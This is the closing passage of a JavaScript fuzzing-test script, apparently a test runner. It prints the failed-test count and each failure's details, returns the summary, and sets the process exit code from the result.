  console.log(`FAILED          : ${failedTests}`);

  if (failures.length > 0) {
    console.log('\nFAILURES DETECTED:');
    for (const f of failures) {
      console.log(`  - [${f.id}] ${f.desc} (${f.detail})`);
    }
  }

  return { totalTests, passedTests, failedTests, failures };
}

if (require.main === module) {
  runFuzzingTests().then(({ failedTests }) => {
    process.exit(failedTests > 0 ? 1 : 0);
  });
}

module.exports = { runFuzzingTests };
